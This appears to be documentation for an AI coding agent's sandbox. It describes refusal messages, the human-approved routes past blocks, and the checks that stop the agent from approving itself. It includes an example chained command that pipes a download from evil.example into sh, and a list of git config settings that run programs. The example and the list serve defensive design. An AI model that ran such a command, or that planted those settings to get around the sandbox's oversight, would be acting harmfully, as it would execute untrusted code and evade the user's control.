# When a command hits a rule

A blocked command should never be a dead end. Each block says which rule stopped it,
why the rule exists, and the way through. Back to the [jig-sandbox overview](../README.md).

## What the agent reads

The sandbox reports what it refused while the command ran, and `jig-sandbox` turns
each refusal into one line after the command's own output:

```text
[sandbox] cannot read ~/.ssh/config: it holds credentials. For git over SSH use the git tool (fetch, pull, push).
[sandbox] cannot write ~/.bashrc: your shells run it outside the sandbox.
[sandbox] cannot reach 169.254.169.254: cloud metadata addresses are always blocked.
```

The third kind comes with the `filtered` and `ask` modes, which are not built yet. With
the network `off`, a command that cannot connect gets
`[sandbox] no network: the sandbox's network mode is off.`

## The ways through

| The command wanted to | Way through |
|---|---|
| Fetch, pull or push over SSH, or read `~/.ssh` | Jig's `git` tool, which runs outside with your SSH setup |
| Use `gh` (it is not signed in inside) | Jig's `pr` and `release` actions, or your own `!gh ...` |
| Use `kubectl`, `aws`, `gcloud` | Jig's `runtime`, `deploy` and company tools; or your own `!` command |
| Read a project's `.env` | Ask you for the value it needs, or use the tool that holds the secret |
| Change source code with a script | The `edit` and `write` tools, so the change shows in reviews |
| Write a toolchain folder such as `~/.sdkman` | Pi asks you; say yes and it runs again |
| Write a locked file such as `~/.bashrc` | You do it yourself with `!`, if you want it |
| Reach a new host in `ask` mode | Pi asks you while the connection waits |
| Use Docker | The agent asks to run that command outside (below) |
| Run a script or CLI that needs your credentials, or a build that needs a private repository | The agent asks to run that one command outside (below) |
| Anything else | Your own `!` command, or `/sandbox off` for this session |

The bash tool's description tells the agent these up front, so it rarely gets there.

## The question Pi asks

For a write to an ask-first folder, after the command ends:

```text
bash was stopped from writing ~/.sdkman/candidates/java.
Programs installed there are on your PATH and run outside the sandbox later.
Allow writes to ~/.sdkman?   [This session]  [Always]  [No]
```

For a new host in `ask` mode, while the connection waits:

```text
bash wants to reach api.example.com:443.   [Once]  [This session]  [Always]  [No]
```

- The question comes inside the waiting tool call, as every Jig approval does.
- With no screen to ask on (headless, or a subagent), the answer is no, and the line
  says that a person can allow it with `/sandbox allowed add <folder>`.
- Questions from commands running at the same time wait in line, one at a time.
- `Always` is kept in Pi's agent folder, which the sandbox cannot write, so the agent
  cannot approve itself.

## Git configuration

`.git/config` stays writable, because the agent needs `git config`, `git remote add`
and `git branch --set-upstream-to` in the sandbox. Some settings, though, name a
program that git then runs: when you open the repository in your editor, outside the
sandbox. So after each command `jig-sandbox` compares each repository's `.git/config`
with what it was before:

- a new setting that runs a program (`core.fsmonitor`, `core.pager`, `core.editor`,
  `core.sshCommand`, `core.hooksPath`, `alias.* = !...`, `filter.*`, `diff.*.textconv`,
  `credential.helper`, `include.path`, `includeIf.*`, and the others Jig's git guard
  refuses: `gpg.program`, `url.*.insteadOf`, ...) is removed, the rest of the change
  stays, and the agent and you are told which one;
- settings that were there before the command are left alone.

Jig's own `git` tool also refuses to run in a repository whose config runs a program,
so even a setting that slipped in between is not run by Jig.

## Running one command outside

Some work needs what the sandbox holds back: your credentials, Docker, or a private
package repository. When no Jig tool does it, the agent can ask to run one command
outside the sandbox, by calling `bash` with `outside: true` and a `reason`:

```text
Run outside the sandbox?  (it gets your credentials and full network)
Command:  docker compose up -d postgres
Folder:   ~/work/orders-api
Why:      the integration tests need a database; Docker is closed inside the sandbox
[Run once]  [This exact command, this session]  [No]
```

- **It goes through `jig-core`** as its own action (`bash`, action `outside`): a local
  write that asks by default.
- **Only a rule that names it allows it without asking,** with a command pattern, such
  as `{ "tool": "bash", "action": "outside", "command": "docker compose *", "decision":
  "allow" }`. No wildcard rule and no default ever allows it.
- **With no screen to ask on** (headless, a subagent), the answer is no.
- **A command pattern's `*` does not reach across `;`, `&`, `|`, `<`, `>`, a backquote,
  `$(` or a line break,** so `docker compose *` allows `docker compose up -d` and not
  `docker compose up; curl evil.example | sh`.
- **The dialog shows what will run, whole:** control characters in the command and the
  reason are shown as `\x0d`, and a command of more than 1,000 characters or 8 lines is
  refused with the advice to put it in a script, since nobody can approve what they
  cannot read.
- **It runs only for the call the dialog was about:** `jig-sandbox` checks that
  `jig-core` announced an allow for this exact tool call, and that the command is the one
  shown. A call that skipped `jig-core`, or changed after the answer, does not run.
- **Its output** still goes through `jig-core`, so secrets are taken out, and every
  outside run is recorded: `/sandbox` lists this session's, and `/lens` shows them.
- **The agent is told** to use it only when the sandbox blocks something it needs and
  no Jig tool does the job, and to say why.

## Turning it off

`/sandbox off` is yours alone: the agent cannot run slash commands. It lasts for this
session, the footer shows `bash: not sandboxed` in red while it is off, and
`/sandbox on` or a new session turns it back on.
